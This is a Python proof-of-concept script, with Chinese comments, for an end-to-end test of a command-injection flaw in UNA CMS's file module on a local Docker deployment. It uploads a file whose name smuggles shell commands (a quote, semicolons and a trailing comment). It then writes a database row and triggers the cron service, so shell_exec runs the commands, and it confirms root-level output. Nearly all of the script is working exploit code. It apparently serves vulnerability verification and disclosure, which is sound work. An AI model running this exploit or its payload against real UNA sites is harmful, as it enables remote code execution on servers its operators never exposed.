#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
UNA CMS BxFilesModule CWE-78 命令注入 — 本地部署端到端验证 (Python 版)

攻击链 (全部走真实 UNA 代码路径)：
  1. HTTP 真实上传入口: storage_uploader.php (uploader=sys_html5, storage=bx_files_files)
     上传文件名含 shell 元字符:  evil.pdf";<cmd>;#   (等价报告 PoC: test.pdf";id;#)
     → BxDolUploaderHTML5::handleUploads → BxDolStorage::storeFileFromForm → storeFile()
     → getFileExt()=pathinfo(PATHINFO_EXTENSION) 原样保留元字符
     → isValidExt(): ext_mode=deny-allow, in_array 精确匹配 sys_files_ext_dangerous → 绕过
     → ext 落库 bx_files_files.ext
  2. 以该 file_id 建立 bx_files_main 条目 (data_processed=0, 等价攻击者表单提交完成)
  3. 触发 BxDolService::call('bx_files','process_files_data')  (等价 sys_cron_jobs 中
     bx_files_process_data * * * * * → BxFilesCronProcessData::processing)
     → BxFilesModule::serviceProcessFilesData() → $sFilePath = tmp/<remote_id>.<ext> (无转义)
     → shell_exec('"<java>" ... --text "<path>.<ext>"')  → 引号闭合 + ;cmd; + # 注释 → 命令执行
  4. 验证: 注入 id;pwd;whoami 的 stdout 经 shell_exec 回写 bx_files_main.data 字段

用法: /tmp/una_venv/bin/python3 una_rce_e2e_py.py
"""
import os, re, sys, time, subprocess, socket, uuid

BASE_URL = "http://localhost:8080"   # 注意: 必须用 localhost (UNA Host 规范化会把 127.0.0.1 301 到 localhost, 丢失 POST body)
DB_HOST, DB_PORT, DB_USER, DB_PASS, DB_NAME = "127.0.0.1", 3307, "una", "una123", "una"
WEB_CONTAINER = "una-web-1"
DB_CONTAINER = "una-db-1"
DOCROOT = "/var/www/html"

import pymysql
import requests


def log(*a):
    print(*a, flush=True)


def db():
    return pymysql.connect(host=DB_HOST, port=DB_PORT, user=DB_USER, password=DB_PASS,
                           database=DB_NAME, charset="utf8mb4", autocommit=True)


def query(sql, args=None, fetchone=False):
    c = db()
    try:
        with c.cursor(pymysql.cursors.DictCursor) as cur:
            cur.execute(sql, args)
            return cur.fetchone() if fetchone else cur.fetchall()
    finally:
        c.close()


def exec_in_container(container, cmd):
    r = subprocess.run(["docker", "exec", container, "sh", "-c", cmd],
                       capture_output=True, text=True, timeout=120)
    return r.stdout, r.stderr, r.returncode


def new_session_cookie():
    """容器内 CLI: 登录 admin 并取 memberSession"""
    out, err, rc = exec_in_container(WEB_CONTAINER, f"cd {DOCROOT} && php gen_session_cli.php")
    m = re.search(r"memberSession=(\S+)", out)
    if not m:
        raise RuntimeError(f"cannot create session: {out} {err}")
    return m.group(1)


def make_multipart_raw(field_name, filename, content, boundary):
    """手工构造 multipart: filename 原样携带 shell 元字符 (模拟浏览器 FormData 行为)"""
    body = b""
    body += b"--" + boundary.encode("utf-8") + b"\r\n"
    body += ('Content-Disposition: form-data; name="%s"; filename="%s"\r\n' % (field_name, filename)).encode("utf-8")
    body += b"Content-Type: application/pdf\r\n\r\n"
    body += content if isinstance(content, bytes) else content.encode("utf-8")
    body += b"\r\n--" + boundary.encode("utf-8") + b"--\r\n"
    return body


def http_upload(sess_cookie, evil_name, content=b"UNA-RCE-E2E-PY\n"):
    """
    真实 HTTP 上传 - 与前端 HTML5 uploader 一致的 XHR 直传通道:
      storage_uploader.php?a=upload&file=<urlencode(name)>
      BxBaseUploaderHTML5::handleUploads(): bx_get('file') -> storeFileFromXhr(name)
      PHP $_GET 会对 file 参数做 URL 解码, 因此引号/分号经 %22 %3B 编码后还原,
      ext 可原样携带 shell 元字符 (与 DB 中先前 XHR 成功记录 file_id=9 一致).
    """
    import urllib.parse as up
    url = (f"{BASE_URL}/storage_uploader.php?uo=sys_html5&so=bx_files_files"
           f"&uid=py{int(time.time())}&a=upload&p=0"
           f"&file={up.quote(evil_name, safe='')}")
    headers = {
        "Cookie": f"memberSession={sess_cookie}",
        "Content-Type": "application/octet-stream",
        "Content-Length": str(len(content)),
        "User-Agent": "Mozilla/5.0 UNA-RCE-E2E",
    }
    r = requests.post(url, headers=headers, data=content, timeout=30)
    return r.status_code, r.text


def trigger_process_files_data():
    """容器内执行与 cron job 完全一致的 service 调用"""
    php = r"""require('/var/www/html/inc/header.inc.php');
$mRes = BxDolService::call('bx_files', 'process_files_data', array(3));
echo "SERVICE_RESULT=" . var_export($mRes, true) . "\n";"""
    cmd = f"cd {DOCROOT} && php -r {shquote(php)}"
    out, err, rc = exec_in_container(WEB_CONTAINER, cmd)
    return out, err


def shquote(s):
    return "'" + s.replace("'", "'\\''") + "'"


def main():
    log("=" * 66)
    log(" UNA BxFilesModule CWE-78 — 本地部署端到端验证 (Python)")
    log("=" * 66)

    # ---------- 0. 环境 ----------
    log("\n[0] 环境前提")
    log("  base_url = " + BASE_URL)
    r = requests.get(BASE_URL + "/storage_uploader.php?uo=sys_html5&so=bx_files_files&uid=x1&a=show_uploader_form", timeout=15)
    log(f"  storage_uploader reachable: HTTP {r.status_code}")
    sess = new_session_cookie()
    log(f"  admin memberSession = {sess[:12]}...")

    # 清理历史测试条目 (可重复执行)
    query("DELETE FROM `bx_files_main` WHERE `title`='e2e rce test py'")
    for row in query("SELECT id FROM bx_files_files WHERE file_name LIKE 'evil%' OR file_name LIKE '%RCE%'"):
        pass  # 保留 storage 记录由 upload 结果管理, 仅清 main 测试行

    # ---------- 1. 真实 HTTP 上传恶意文件名 ----------
    ts = int(time.time())
    payload_cmd = "id;pwd;whoami"
    evil_name = f'evil_{ts}.pdf";{payload_cmd};#'
    log("\n[1] 真实 HTTP 上传 (storage_uploader.php)")
    log(f"  恶意文件名: {evil_name}")
    code, resp = http_upload(sess, evil_name)
    log(f"  HTTP {code}  resp={resp[:200]}")
    if "success" not in resp:
        log("  [!!] 上传未返回 success —— 中止")
        return

    # 取最新上传记录, 校验 ext
    row = query("SELECT id, file_name, ext FROM bx_files_files ORDER BY id DESC LIMIT 1", fetchone=True)
    fid = int(row["id"])
    fname, fext = row["file_name"], row["ext"]
    log(f"  落库 file_id={fid}")
    log(f"  file_name = {fname!r}")
    log(f"  ext       = {fext!r}")
    exp = re.search(r'\.pdf".*;#', fext)
    if '"' in fext and ';' in fext and fext.endswith('#'):
        log("  ✓ 元字符 \" ; # 原样落库 (HTTP multipart filename 未被转义过滤)")
    else:
        log("  [!] ext 未完整保留元字符, 检查实际落库值")
        return

    # ---------- 2. 建立 bx_files_main 条目 (data_processed=0) ----------
    log("\n[2] 建立 bx_files_main 条目 (data_processed=0, file_id=%d)" % fid)
    now = int(time.time())
    query("INSERT INTO `bx_files_main` "
          "(`author`,`added`,`changed`,`file_id`,`title`,`cat`,`desc`,`data`,`data_processed`,"
          "`labels`,`location`,`allow_view_to`,`status`,`status_admin`,`type`) "
          "VALUES (1, %s, %s, %s, 'e2e rce test py', 0, '', '', 0, '', '', 3, 'active', 'active', 'file')",
          (now, now, fid))
    cid = query("SELECT id FROM bx_files_main WHERE file_id=%s AND title='e2e rce test py'", (fid,), fetchone=True)["id"]
    cnt = query("SELECT COUNT(*) n FROM bx_files_main WHERE data_processed=0")[0]["n"]
    log(f"  content_id={cid}, 待处理条目数={cnt}")

    # ---------- 3. 触发 cron service ----------
    log("\n[3] 触发 BxDolService::call('bx_files','process_files_data')")
    out, err = trigger_process_files_data()
    log("  php stdout: " + out.strip()[:300])
    if err.strip():
        log("  php stderr: " + err.strip()[:300])

    # ---------- 4. 验证注入结果 ----------
    log("\n[4] 验证命令注入执行结果")
    row = query("SELECT data_processed, data FROM bx_files_main WHERE id=%s", (cid,), fetchone=True)
    data = row["data"] or ""
    log(f"  data_processed = {row['data_processed']}")
    log(f"  data 字段内容:\n  " + data.replace("\n", "\n  "))
    if re.search(r"^uid=\d+.*\(root\)", data, re.M):
        log("\n  >>> 命令注入 → RCE 确认: id;pwd;whoami 以 PHP 进程身份 (root) 执行, stdout 已回写 <<<")
        log("      (即使容器内无 java: shell 分号分隔使注入命令独立执行)")
        verdict = "CONFIRMED"
    else:
        log("\n  [!!] 未观察到 uid= 输出 —— 需进一步核查")
        verdict = "NOT-CONFIRMED"

    # ---------- 5. 清理 ----------
    log("\n[5] 清理测试条目")
    query("DELETE FROM bx_files_main WHERE id=%s", (cid,))
    log("  已删除 bx_files_main 测试条目 (storage 记录保留供复核)")

    log("\n" + "=" * 66)
    log(f" 最终结论: {verdict}")
    log("=" * 66)


if __name__ == "__main__":
    main()
